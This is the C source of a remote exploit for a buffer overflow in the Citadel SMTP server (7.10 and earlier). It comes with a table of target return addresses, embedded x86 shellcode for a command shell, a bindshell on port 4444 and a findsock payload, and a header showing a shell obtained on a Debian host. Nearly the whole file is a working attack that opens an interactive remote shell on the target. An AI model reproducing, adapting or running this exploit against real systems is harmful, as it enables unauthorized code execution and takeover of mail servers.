/* Citadel SMTP <=7.10 remote exploit (0day)
 * ========================================
 * Citadel is a different kind of messaging and collaboration platform. While others focus on
 * automating business processes, Citadel focuses on connecting communities of people together.
 * A remotely exploitable buffer overflow has been identified in the SMTP service on TCP port 25
 * provided by Citadel due to insufficient bounds checking performed during memory copy 
 * operations involving user supplied strings. To find targets for other platforms look at 
 * the core dump generated from target 0x41424344 and use the value in %esp or find a suitable 
 * "jmp %esp" in memory, such as the one supplied for debian which may vary across distributions.
 * This vulnerability has been patched through a responsible disclosure process in version
 * 7.11 & above of Citadel in June 2007. Free software for a free society.
 *
 * Example Use.
 * localhost citadel # ./prdelka-vs-GNU-citadel -s 192.168.1.65 -x 1 -t 7 2>/dev/null 
 * [ Citadel SMTP <= 7.10 remote exploit (0day)
 * [ Using shellcode 'GNU/Linux bindshell(4444/tcp)evasive [x86]' (140 bytes)
 * [ Using target '(Citadel 7.10) Multiple 2.4.x (Multiple) x86 all'
 * [ Connected to 192.168.1.65 (25/tcp)
 * [ Banner: 220 localhost.localdomain ESMTP Citadel server ready.
 * [ Recieved (127)bytes, Sent (275)bytes
 * [ Connection established to remote host.
 * 20:08:59 up 26 min,  1 user,  load average: 0.00, 0.00, 0.00
 * Linux debian 2.4.27-3-386 #1 Mon May 29 23:50:41 UTC 2006 i686 GNU/Linux
 * uid=1001(citadel) gid=100(users) groups=100(users)
 *  20:08:59 up 26 min,  1 user,  load average: 0.00, 0.00, 0.00
 * USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
 * root     tty1     -                19:46    6.00s  0.09s  0.09s -bash
 *
 * - prdelka
 */
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <getopt.h>
#include <signal.h>
#include "libtag/libtag.h"

void handler(int sig);

struct target {
	char* name; 
	int retaddr;	
};

struct shellcode {
	char* name;	
	char* shellcode;	
};

const int targetno = 15;

struct target targets[] = { 
	{"(Citadel 6.72) (Gentoo Linux 3.3.5-r1) 2.4 x86 (init.d)", 0x7f7fa614},
	{"(Citadel 6.72) (Gentoo Linux 3.3.5-r1) 2.4 x86 standalone", 0x7f5fa5f4},
	{"(Citadel 7.10) (Gentoo Linux 3.3.5-r1) 2.6 x86 (init.d)", 0xb7ad39f0},
	{"(Citadel 7.10) (Gentoo Linux 3.3.5-r1) 2.6 x86 (init.d) 2", 0xb78199f0},
	{"(Citadel 7.10) (Gentoo Linux 3.3.5-r1) 2.6 x86 (init.d) 3", 0xb78199b4},
	{"(Citadel 7.10) (Gentoo Linux 3.3.5-r1) 2.6 x86 (init.d) 4", 0xb781a0f0},
	{"(Citadel 7.10) (Gentoo Linux 3.3.5-r1) 2.6 x86 standalone", 0xb7b1c9f0},
	{"(Citadel 6.72) (Debian Linux 3.1r2) 2.4 x86 (init.d)",0xbf3fa5f4},
	{"(Citadel 6.72) (Debian Linux 3.1r2) 2.4 x86 standalone", 0xbf5fa5f4},
	{"(Citadel 7.10) (Debian Linux 3.1r2) 2.4 x86 (init.d)",0xbf5fb5d4},
	{"(Citadel 7.10) (Debian Linux 3.1r2) 2.4 x86 standalone",0xbf5fb5f4},
	{"(Citadel 7.10) (Debian Linux 3.1r2) 2.4 x86 standalone 2",0xbf7fb5f4},
	{"(Citadel 7.10) (Debian Linux 3.1r2) 2.4 x86 (jmp esp) any",0x08081836},
	{"(Citadel 7.10) (Debian Linux 3.1r2) 2.4 x86 (debpkg init.d)",0xbf5fc1f4},
	{"(Citadel 7.10) (Debian Linux 4.0) 2.6 x86 (init.d)",0xb7a09f30}
};

const int shellno = 3;

struct shellcode shellcodes[] = {
	{"GNU/Linux execve(\"/bin/sh -c\") [x86]",
	"\xeb\x67\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x5f\x89\xf9\x31\xc0\x26\x89\x06"
	"\x26\xff\x36\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
	"\x6e\x89\xe3\x26\x89\x06\x26\xff\x36\x66\x68\x2d"
	"\x63\x89\xe7\x26\x89\x06\x26\xff\x36\x89\xc8\x26"
	"\x89\x06\x26\xff\x36\x89\xf8\x26\x89\x06\x26\xff"
        "\x36\x89\xd8\x26\x89\x06\x26\xff\x36\x89\xe6\x89"
	"\xf1\x31\xc0\xb0\x08\x04\x03\xcd\x80\xe8\xae\xff"
	"\xff\xff"},
	{"GNU/Linux bindshell(4444/tcp) [x86]",
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x29\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x90"
	"\xbd\x5c\x9b\x83\xeb\xfc\xe2\xf4\xa1\x66\x0f\xd8\xc3\xd7\x5e\xf1"
	"\xf6\xe5\xc5\x12\x71\x70\xdc\x0d\xd3\xef\x3a\xf3\x81\xe1\x3a\xc8"
	"\x19\x5c\x36\xfd\xc8\xed\x0d\xcd\x19\x5c\x91\x1b\x20\xdb\x8d\x78"
	"\x5d\x3d\x0e\xc9\xc6\xfe\xd5\x7a\x20\xdb\x91\x1b\x03\xd7\x5e\xc2"
	"\x20\x82\x91\x1b\xd9\xc4\xa5\x2b\x9b\xef\x34\xb4\xbf\xce\x34\xf3"
	"\xbf\xdf\x35\xf5\x19\x5e\x0e\xc8\x19\x5c\x91\x1b"},
	{"GNU/Linux findsock [x86]",
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x2b\xc9\x83\xe9\xee\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xe0"
	"\xe2\xdb\xe8\x83\xee\xfc\xe2\xf4\xd1\x39\x88\x61\x06\x88\x9b\x5f"
	"\xea\xb1\x8d\xbb\x69\x03\x5d\x13\x86\x1d\xda\x82\x86\xba\x16\x68"
	"\x61\xdc\xb6\x9b\x86\xc3\xae\x18\xbf\x6b\x20\x82\xe2\xbb\xb1\xd7"
	"\xb8\x2f\x5b\xa1\x99\x1a\xb1\xe3\xb8\x7b\x89\x80\xcf\xcd\xa8\x80"
	"\x88\xcd\xb9\x81\x8e\x6b\x38\xba\xb3\x6b\x3a\x25\x60\xe2\xdb\xe8"}
};

void handler(int sig){
	printf("\e[34m\[ caught signal, reseting the terminal display.\r\n\e[0m");
        exit(sig);
}

int main (int argc, char *argv[]) {
	int sd, rc, sc, i, c, ret, payg, eip, ishell = 0, port = 25, ihost = 0, itarg = 0, iok = 0;	 
	int count, offset, ioffset,rcv, index = 0,loffset = 0;	
	short shellport, shellport2;
	char *host, *buffer, *buffer2, *payload, *command, *sockbuf;
	char hello[] = "HELO yahoo.com\n";
	char mailfrom[] = "MAIL FROM: <hacker@yahoo.com>\n";
	struct sockaddr_in locAddr, servAddr;
	struct hostent *h, *rv;
        static struct option options[] = {
        	{"server", 1, 0, 's'},
	        {"port", 1, 0, 'p'},
        	{"target", 1, 0, 't'},
		{"shellcode", 1, 0, 'x'},
		{"cmd", 1, 0, 'c'},
		{"help", 0, 0,'h'}
        };
	signal(SIGINT,handler);
	tag();
	printf("\e[1m\e[34m[ Citadel SMTP <= 7.10 remote exploit (0day)\n");
	while(c != -1)
	{
	        c = getopt_long(argc,argv,"s:p:t:c:x:h",options,&index);	
        	switch(c) {
               		case -1:
	                        break;
        	        case 's':
				if(ihost==0){
				h = gethostbyname(optarg);				
				if(h==NULL){
					printf("[ Error unknown host '%s'\n",optarg);
					exit(1);
				}
				host = malloc(strlen(optarg) + 1);
				sprintf(host,"%s",optarg);
				ihost = 1;
				}
               			break;
	                case 'p':
				port = atoi(optarg);
                	        break;
			case 'x':
				if(ishell==0)
				{
				payg = atoi(optarg);
				switch(payg){
				case 0:		
					printf("[ Using shellcode '%s' (%d bytes)\n",shellcodes[payg].name,strlen(shellcodes[payg].shellcode));		
					payload = malloc(strlen(shellcodes[payg].shellcode)+1);
					memset(payload,0,strlen(shellcodes[payg].shellcode)+1);
					memcpy((void*)payload,(void*)shellcodes[payg].shellcode,strlen(shellcodes[payg].shellcode));
					ishell = 1;
					break;
				case 1:
					printf("[ Using shellcode '%s' (%d bytes)\n",shellcodes[payg].name,strlen(shellcodes[payg].shellcode));
                                        payload = malloc(strlen(shellcodes[payg].shellcode)+1);
                                        memset(payload,0,strlen(shellcodes[payg].shellcode)+1);
                                        memcpy((void*)payload,(void*)shellcodes[payg].shellcode,strlen(shellcodes[payg].shellcode));
                                        ishell = 2;
                                        break;					
                                case 2:
                                        printf("[ Using shellcode '%s' (%d bytes)\n",shellcodes[payg].name,strlen(shellcodes[payg].shellcode));
                                        payload = malloc(strlen(shellcodes[payg].shellcode)+1);
                                        memset(payload,0,strlen(shellcodes[payg].shellcode)+1);
                                        memcpy((void*)payload,(void*)shellcodes[payg].shellcode,strlen(shellcodes[payg].shellcode));
                                        ishell = 3;
                                        break;
				default:
					printf("[ Invalid shellcode selection %d\n",payg);
					exit(0);
					break;
				}
				}
				break;
			case 'c':
				if(ishell==1)
				{
					iok = 1;
					printf("[ Using command '%s'\n",optarg);
					command = malloc(strlen(optarg)+1);
					memset(command,0,strlen(optarg)+1);
					memcpy((void*)command,(void*)optarg,strlen(optarg));
					break;
				}
				else{
					printf("[ No shellcode selected yet or bad arguement, ignoring command selection\n",optarg);
					break;
				}
				break;
	                case 't':
				if(itarg==0){
				ret = atoi(optarg);							
				switch(ret){
					case 1:				
						printf("[ Using target '%s'\n",targets[ret-1].name);
						eip = targets[ret-1].retaddr;
						break;
					case 2:
                                                printf("[ Using target '%s'\n",targets[ret].name);
                                                eip = targets[ret-1].retaddr;
                                                break;
					case 3:
						printf("[ Using target '%s'\n",targets[ret].name);
						eip = targets[ret-1].retaddr;
						break;
					case 4:
						printf("[ Using target '%s'\n",targets[ret].name);
						eip = targets[ret-1].retaddr;
						break;
                                        case 5:
                                                printf("[ Using target '%s'\n",targets[ret].name);
                                                eip = targets[ret-1].retaddr;
                                                break;
                                        case 6:
                                                printf("[ Using target '%s'\n",targets[ret-1].name);
                                                eip = targets[ret-1].retaddr;
                                                break;
                                        case 7:
                                                printf("[ Using target '%s'\n",targets[ret-1].name);
                                                eip = targets[ret-1].retaddr;
                                                break;
					case 8:
                                                printf("[ Using target '%s'\n",targets[ret-1].name);
                                                eip = targets[ret-1].retaddr;
                                                break;
                                        case 9:
                                                printf("[ Using target '%s'\n",targets[ret-1].name);
                                                eip = targets[ret-1].retaddr;
                                                break;
                                        case 10:
                                                printf("[ Using target '%s'\n",targets[ret-1].name);
                                                eip = targets[ret-1].retaddr;
                                                break;
                                        case 11:
                                                printf("[ Using target '%s'\n",targets[ret-1].name);
                                                eip = targets[ret-1].retaddr;
                                                break;
                                        case 12:
                                                printf("[ Using target '%s'\n",targets[ret-1].name);
                                                eip = targets[ret-1].retaddr;
                                                break;
                                        case 13:
                                                printf("[ Using target '%s'\n",targets[ret-1].name);
                                                eip = targets[ret-1].retaddr;
                                                break;
                                        case 14:
                                                printf("[ Using target '%s'\n",targets[ret-1].name);
                                                eip = targets[ret-1].retaddr;
                                                break;
					case 15:
						loffset = 1;
                                                printf("[ Using target '%s'\n",targets[ret-1].name);
                                                eip = targets[ret-1].retaddr;
                                                break;						
					default:
						eip = strtoul(optarg,NULL,16);
						printf("[ Using return address '0x%x'\n",eip);
						break; // bug in that target selection can occur twice(must reset offset)
				}
				itarg = 1;
				}
        	                break;
			case 'h':			
				printf("[ Usage instructions.\n[\n");				
				printf("[ %s <required> (optional)\n[\n[   --server|-s <ip/hostname>\n",argv[0]);
				printf("[   --port|-p (port)[default 25]\n[   --shellcode|-x <shell#>\n");
				printf("[   --cmd|-c (command)\n");
				printf("[   --target|-t <target#/0xretaddr>\n[\n");
				printf("[ Target#'s\n");
				for(count = 1;count <= targetno;count++){
					if(count<10){
						printf("[  %d \"%s\" (0x%x)\n",count,targets[count-1],targets[count-1]);
					}
					else{
						printf("[ %d \"%s\" (0x%x)\n",count,targets[count-1],targets[count-1]);
					}
				}
				printf("[\n[ Shellcode#'s\n");
				for(count = 0;count <= shellno - 1;count++){
					printf("[ %d \"%s\" (length %d bytes)\n",count,shellcodes[count].name,strlen(shellcodes[count].shellcode));
				}
				printf("\e[0m");
				exit(0);
				break;
			default:
                		break;
	        }
	}
	if(itarg != 1 || ihost  != 1 || ishell <= 0 || ishell==1 & iok != 1){
		printf("[ Error insufficient arguements, try running '%s --help'\e[0m\n",argv[0]);
		exit(1);
	}
        servAddr.sin_family = h->h_addrtype;
	memcpy((char *) &servAddr.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
	servAddr.sin_port = htons(port);
	sd = socket(AF_INET, SOCK_STREAM, 0);
	if(sd<0) {
		printf("[ Cannot open socket\e[0m\n");	
		exit(1);
	}
	rc = connect(sd, (struct sockaddr *) &servAddr, sizeof(servAddr));
	if(rc<0) {
		printf("[ Cannot connect\e[0m\n");
		exit(1);
	}		
	printf("[ Connected to %s (%d/tcp)\n",host,port);	
	buffer = malloc(2049);
	memset(buffer,0,2049);
	rc = read(sd,buffer,2048);
	printf("[ Banner: %s",buffer);
        buffer[rc] = 0x00;
	if(strstr(buffer, "Citadel") == NULL){
		printf("[ %s is not running Citadel SMTP\e[0m\n",host);
		exit(1);
	}	
	sc = send(sd,hello,strlen(hello),0);
	rc+= read(sd,buffer,2048);
	sc+= send(sd,mailfrom,strlen(mailfrom),0);
	rc+= read(sd,buffer,2048);
	if(ishell==1){
		buffer = malloc(2048 + strlen(payload) + strlen(command) + sizeof(eip));
		memset(buffer,0,2048 + strlen(payload) + strlen(command) + sizeof(eip));
	}
	else{
                buffer = malloc(2048 + strlen(payload) + sizeof(eip));
                memset(buffer,0,2048 + strlen(payload) + sizeof(eip));		
	}
	strcpy(buffer,"RCPT TO: ");
	if(loffset==0){
	  	for(count = 0;count <= 75;count++){
			strcat(buffer,"A");
		}
	}
	if(loffset==1){
                for(count = 0;count <= 79;count++){
                        strcat(buffer,"A");
                }		
	}
	buffer2 = (char*)((int)buffer + (int)strlen(buffer));
	memcpy((void*)buffer2,(void*)&eip,sizeof(eip));
	buffer2 = (char*)((int)buffer2 + sizeof(eip));
	memcpy((void*)buffer2,(void*)payload,strlen(payload));
	buffer2 = (char*)((int)buffer2 + strlen(payload));
	if(ishell==1){
		memcpy((void*)buffer2,(void*)command,strlen(command));
	}
	strcat(buffer,"\n");
	sc+= send(sd,buffer,strlen(buffer),0);
	if(ishell==1|0)
		close(sd);
	printf("[ Recieved (%d)bytes, Sent (%d)bytes\n",rc,sc);
	if(ishell==2){
		servAddr.sin_port=htons(4444);
	        sleep(1);
        	sd = socket(AF_INET, SOCK_STREAM, 0);
        	rc = connect(sd, (struct sockaddr *) &servAddr, sizeof(servAddr));
	        if(rc<0){
        	        printf("[ Cannot connect to foreign host.\e[0m\n");
                	exit(1);
	        }
		printf("[ Connection established to remote host.\n");
		sockbuf = malloc(2048);
		fd_set readfds;
		printf("\e[32m\e[1m");
		sprintf(sockbuf, "uptime;uname -a;id;w\n");
		write(sd, sockbuf, strlen(sockbuf));
		while (1) {
			FD_ZERO(&readfds);
			FD_SET(0, &readfds);
			FD_SET(sd, &readfds);
			select(255, &readfds, NULL, NULL, NULL);
			if (FD_ISSET(sd, &readfds)) {
			memset(sockbuf, 0, 2048);
			rcv = read(sd, sockbuf, 2047);
			if (rcv <= 0) {
              			printf("\r\n\e[1m\e[34m[ Connection closed by foreign host.\n\e[0m");
              			exit(-1);
            			}
			printf("%s", sockbuf);
			}
      		if(FD_ISSET(0, &readfds)) {
			memset(sockbuf, 0, 2048);
			read(0, sockbuf, 2048);
			write(sd, sockbuf, 2048);
        		}	    	
		}
	}	
	if(ishell==3){
		sockbuf = malloc(2048);
		sprintf(sockbuf,"\x6d\x73\x66\x21");
		write(sd, sockbuf, strlen(sockbuf));
		memset(sockbuf, 0, 2048);
                sleep(1);
                printf("[ Opening existing connection to remote host.\e[0m\n");
                fd_set readfds;
                printf("\e[32m\e[1m");
                sprintf(sockbuf, "uptime;uname -a;id;w\n");
                write(sd, sockbuf, strlen(sockbuf));
                while (1) {
                        FD_ZERO(&readfds);
                        FD_SET(0, &readfds);
                        FD_SET(sd, &readfds);
                        select(255, &readfds, NULL, NULL, NULL);
                        if (FD_ISSET(sd, &readfds)) {
                        memset(sockbuf, 0, 2048);
                        rcv = read(sd, sockbuf, 2047);
                        if (rcv <= 0) {
                                printf("\r\n\e[1m\e[34m[ Connection closed by foreign host.\n\e[0m");
                                exit(-1);
                                }
                        printf("%s", sockbuf);
                        }
                if(FD_ISSET(0, &readfds)) {
                        memset(sockbuf, 0, 2048);
                        read(0, sockbuf, 2048);
                        write(sd, sockbuf, 2048);
                        }
                }
        }
	exit(0);
}

